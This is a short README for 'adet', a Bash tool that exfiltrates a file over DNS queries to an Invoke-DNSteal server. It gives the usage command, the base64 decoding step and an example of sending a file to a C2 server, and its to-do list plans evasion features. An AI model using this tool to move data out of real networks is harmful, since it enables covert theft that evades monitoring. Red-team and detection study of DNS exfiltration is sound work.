# adet: Another DNS Exfiltration Tool
Bash script for sending file to Invoke-DNSteal server

# Instructions:
1. Run [Invoke-DNSteal.py](https://github.com/JoelGMSec/Invoke-DNSteal ) in your DNS server
2. Use:
```
./adet.sh <file> <domain>
```
3. Decode the received file in base64
```
base64 -d <received_file>
```

Example: Sending [byp4xx.py](https://github.com/lobuhi/byp4xx/blob/main/byp4xx.py) to my own customized C2/DNS server 
![=250x](dnsteal.jpg)

# TO-DO:
 - Add random sleep option
 - Add random domain when DNS server is specified
 - Add byte length option
 - Add TCP option
 - Add encryption? Why not?
